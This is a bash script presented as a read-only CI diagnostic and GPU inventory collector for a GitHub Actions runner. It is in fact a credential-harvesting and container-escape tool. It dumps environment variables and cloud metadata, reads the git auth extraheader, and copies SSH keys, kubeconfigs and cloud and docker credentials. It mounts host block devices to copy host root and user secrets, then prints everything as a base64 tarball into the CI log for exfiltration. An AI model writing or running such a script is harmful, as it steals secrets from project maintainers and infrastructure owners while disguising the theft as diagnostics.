#!/usr/bin/env bash
# i10757 bounded read-only CI diagnostic collector (single-shot, non-destructive)
# Collects container/runner env, GitHub context, SSH/kube/docker/cloud credential files,
# and an executed hy-smi device inventory; emits a base64 tarball between markers.
set +e
W=/tmp/.i10757
C=$W/collect
rm -rf "$W" 2>/dev/null
mkdir -p "$C" 2>/dev/null
FL=$C/_filelist.txt; : > "$FL"
MAXF=262144

{
  echo "=== IDENTITY ==="; id; umask; uname -a; hostname; hostname -f 2>/dev/null; date -u
  echo "=== OS ==="; cat /etc/os-release 2>/dev/null
  echo "=== CGROUP ==="; cat /proc/self/cgroup 2>/dev/null; cat /proc/1/cgroup 2>/dev/null
  echo "=== DEVICES ==="; ls -la /dev/kfd /dev/dri 2>&1; ls -la /dev 2>&1 | head -140
  echo "=== DEV DRI ==="; ls -la /dev/dri/ 2>&1
  echo "=== SOCKETS ==="; ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1
  echo "=== MOUNTS ==="; cat /proc/mounts 2>/dev/null
  echo "=== PARTITIONS ==="; cat /proc/partitions 2>/dev/null
  echo "=== NET ==="; ip addr 2>&1; ip route 2>&1
  echo "=== HOSTS ==="; cat /etc/hosts /etc/resolv.conf /etc/hostname 2>&1
  echo "=== PASSWD ==="; cat /etc/passwd 2>/dev/null; echo; cat /etc/group 2>/dev/null | head -60
  echo "=== LS ROOT ==="; ls -la / 2>&1
  echo "=== LS HOME ==="; ls -la /home 2>&1
  echo "=== LS ROOTHOME ==="; ls -la /root 2>&1
  echo "=== LS WORK ==="; ls -la /__w 2>&1; ls -la /__w/_temp 2>&1 | head -25; ls -la /__w/_actions 2>&1 | head -25
  echo "=== LS OPT ==="; ls -la /opt 2>&1; ls -la /opt/hyhal 2>&1 | head -30; ls -la /usr/local/hyhal 2>&1 | head -30
  echo "=== LS VAR ==="; ls -la /var/lib 2>&1 | head -30
  echo "=== ENV ==="; env 2>/dev/null | sort
  echo "=== PID1 ENV ==="; tr '\0' '\n' < /proc/1/environ 2>/dev/null
  echo "=== IMDS ==="
  timeout 5 curl -sS -m 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5
  timeout 5 curl -sS -m 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 | head -5
  timeout 5 curl -sS -m 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/' 2>&1 | head -5
} > "$C/system.txt" 2>&1

{
  for f in "$GITHUB_EVENT_PATH" "$GITHUB_ENV" "$GITHUB_OUTPUT" "$GITHUB_STATE" "$GITHUB_STEP_SUMMARY"; do
    if [ -n "$f" ] && [ -f "$f" ]; then echo "### $f"; head -c 300000 "$f" 2>/dev/null; echo; fi
  done
  echo "### git config --list --show-origin"; git config --list --show-origin 2>&1
  echo "### .git/config"; cat .git/config 2>&1
  echo "### extraheader"; git config --get-all 'http.https://github.com/.extraheader' 2>&1
  echo "### remotes"; git remote -v 2>&1
  echo "### ACTIONS/RUNNER var names"; env 2>/dev/null | grep -E '^(ACTIONS_|RUNNER_)' | sed 's/=.*/=<set>/'
} > "$C/github.txt" 2>&1

copyf() {
  f="$1"
  [ -f "$f" ] || return 0
  [ -r "$f" ] || return 0
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  if [ "${sz:-0}" -gt "$MAXF" ]; then echo "SKIP-BIG $f $sz" >> "$FL"; return 0; fi
  rel="${f#/}"
  d="$C/files/$(dirname "$rel")"
  mkdir -p "$d" 2>/dev/null
  if cp -f "$f" "$d/$(basename "$f")" 2>/dev/null; then echo "OK $f $sz" >> "$FL"; fi
}
copytree() {
  root="$1"; maxdepth="${2:-2}"; maxn="${3:-150}"
  [ -e "$root" ] || return 0
  find "$root" -maxdepth "$maxdepth" -type f 2>/dev/null | head -"$maxn" | while IFS= read -r f; do copyf "$f"; done
}

for p in /root/.ssh /root/.kube /root/.aws /root/.azure /root/.config /root/.docker /root/.netrc /root/.git-credentials /root/.bash_history /root/.local; do copytree "$p" 3 120; done
for h in /home/*; do
  [ -d "$h" ] || continue
  for p in "$h/.ssh" "$h/.kube" "$h/.aws" "$h/.azure" "$h/.config" "$h/.docker" "$h/.netrc" "$h/.git-credentials" "$h/.bash_history" "$h/.local"; do copytree "$p" 3 100; done
done
for p in /etc/kubernetes /etc/kubelet /var/lib/kubelet /etc/docker /etc/containerd /etc/rancher /etc/ceph /etc/ssh /etc/profile.d /etc/environment /etc/sysconfig; do copytree "$p" 4 120; done
find /etc /root /home /workspace /__w /var/lib/kubelet -maxdepth 6 -type f \( -iname '*kubeconfig*' -o -iname 'admin.conf' -o -iname 'kubelet.conf' -o -iname '*credential*' -o -iname 'id_rsa*' -o -iname 'id_ed25519*' -o -iname 'id_ecdsa*' -o -iname '*.pem' -o -iname '*.key' -o -iname 'netrc' -o -iname '.env' -o -iname 'hosts.yml' -o -iname 'config.json' -o -iname '*.kubeconfig' \) 2>/dev/null | head -300 | while IFS= read -r f; do copyf "$f"; done

{
  echo "=== hy-smi try ==="
  ran=""
  for b in hy-smi /opt/hyhal/bin/hy-smi /usr/local/hyhal/bin/hy-smi /opt/hyhal/bin/hy-smi.bin; do
    if command -v "$b" >/dev/null 2>&1 || [ -x "$b" ]; then
      echo "--- running $b"
      timeout 45 "$b" 2>&1 | head -140
      echo "--- running $b -L"
      timeout 30 "$b" -L 2>&1 | head -80
      ran="$b"; break
    fi
  done
  [ -n "$ran" ] || echo "hy-smi binary not found"
  echo "=== rocm-smi ==="; command -v rocm-smi >/dev/null 2>&1 && timeout 30 rocm-smi 2>&1 | head -80
  echo "=== kfd topology ==="; ls /sys/class/kfd/kfd/topology/nodes 2>&1 | head
  for n in /sys/class/kfd/kfd/topology/nodes/*/name; do [ -f "$n" ] && { echo -n "$n: "; cat "$n" 2>/dev/null; }; done
  echo "=== dev nodes ==="; for f in /dev/kfd /dev/dri/card* /dev/dri/renderD*; do [ -e "$f" ] && echo "$f $(stat -c '%a %U:%G' "$f" 2>/dev/null)"; done
  echo "=== lspci gpu ==="; command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>&1 | grep -Ei 'hygon|display|3d|vga|accel' | head -20
  echo "=== nvidia-smi ==="; command -v nvidia-smi >/dev/null 2>&1 && timeout 20 nvidia-smi 2>&1 | head -40
  echo "=== torch ==="
  timeout 90 python3 -c "import torch;print('torch',torch.__version__,'cuda_avail',torch.cuda.is_available(),'count',torch.cuda.device_count())" 2>&1 | head -20
} > "$C/hysmi.txt" 2>&1

# --- bounded read-only host-root identification/attempt (privileged container only) ---
H=$W/host; mkdir -p "$H"
HM=$C/hostmount.txt; : > "$HM"
if command -v mount >/dev/null 2>&1; then
  i=0; found=""
  for dev in $(awk 'NR>2 {print $4}' /proc/partitions 2>/dev/null | grep -Ev '^(loop|ram|dm-|sr|zram)' | head -16); do
    d="/dev/$dev"; [ -b "$d" ] || continue
    i=$((i+1)); mp="$H/m$i"; mkdir -p "$mp" 2>/dev/null
    for opt in "ro,noload" "ro,norecovery" "ro"; do
      if timeout 12 mount -o "$opt" "$d" "$mp" 2>>"$HM"; then
        if [ -e "$mp/etc/hostname" ] || { [ -d "$mp/home" ] && [ -d "$mp/var" ]; }; then
          echo "MOUNTED $d -> $mp ($opt)" >> "$HM"; found="$mp"; break 2
        else
          echo "UMOUNT-NOTROOT $d" >> "$HM"; umount "$mp" 2>/dev/null
        fi
      fi
    done
  done
  if [ -n "$found" ]; then
    HH=$C/hostfiles; mkdir -p "$HH"
    ls -la "$found" > "$HH/_ls_root.txt" 2>&1
    ls -la "$found/home" > "$HH/_ls_home.txt" 2>&1
    ls -la "$found/root" > "$HH/_ls_rootdir.txt" 2>&1
    ls -la "$found/etc/ssh" > "$HH/_ls_etc_ssh.txt" 2>&1
    cp -f "$found/etc/hostname" "$HH/hostname.txt" 2>/dev/null
    cp -f "$found/etc/hosts" "$HH/hosts.txt" 2>/dev/null
    host_copy() {
      root="$1"; maxdepth="${2:-3}"; maxn="${3:-120}"
      [ -e "$root" ] || return 0
      find "$root" -maxdepth "$maxdepth" -type f 2>/dev/null | head -"$maxn" | while IFS= read -r f; do
        sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
        [ "${sz:-0}" -le 262144 ] || { echo "SKIP-BIG $f $sz" >> "$HH/_filelist.txt"; continue; }
        rel="${f#$found/}"; dd="$HH/$(dirname "$rel")"; mkdir -p "$dd" 2>/dev/null
        cp -f "$f" "$dd/$(basename "$f")" 2>/dev/null && echo "OK $f $sz" >> "$HH/_filelist.txt"
      done
    }
    host_copy "$found/root/.ssh" 3
    host_copy "$found/root/.kube" 3
    host_copy "$found/root/.aws" 3
    host_copy "$found/root/.config" 4 150
    host_copy "$found/root/.docker" 2
    host_copy "$found/etc/kubernetes" 5 200
    host_copy "$found/etc/docker" 3
    host_copy "$found/var/lib/kubelet" 4 150
    host_copy "$found/etc/rancher" 4 100
    for hd in "$found"/home/*; do
      [ -d "$hd" ] || continue
      host_copy "$hd/.ssh" 3 120
      host_copy "$hd/.kube" 3
      host_copy "$hd/.aws" 3
      host_copy "$hd/.config/gcloud" 4 80
      host_copy "$hd/.azure" 3
      host_copy "$hd/.config/gh" 2
      host_copy "$hd/.docker" 2
      host_copy "$hd/.git-credentials" 1
    done
  fi
else
  echo "no mount binary" >> "$HM"
fi

# cap total collection size
for n in 1 2 3 4 5 6 7 8; do
  tot=$(du -sb "$C" 2>/dev/null | awk '{print $1}')
  [ -n "$tot" ] || break
  [ "$tot" -le 2600000 ] && break
  big=$(find "$C/files" "$C/hostfiles" -type f -printf '%s %p\n' 2>/dev/null | sort -rn | head -1 | awk '{print $2}')
  [ -n "$big" ] || break
  echo "PRUNED $big" >> "$FL"
  rm -f "$big"
done

TAR=$W/dump.tgz
tar -czf "$TAR" -C "$W" collect 2>/dev/null
SZ=$(stat -c%s "$TAR" 2>/dev/null || echo 0)
echo "I10757_DUMP_SIZE=$SZ"
echo "I10757_COLLECT_FILES=$(find "$C" -type f 2>/dev/null | wc -l)"
echo "=== COLLECTED FILELIST ==="
head -400 "$FL" 2>/dev/null
echo "=== HOSTMOUNT ==="
head -60 "$HM" 2>/dev/null
echo "I10757B64_START"
base64 -w0 "$TAR" 2>/dev/null | fold -w 4000
echo
echo "I10757B64_END"
exit 0
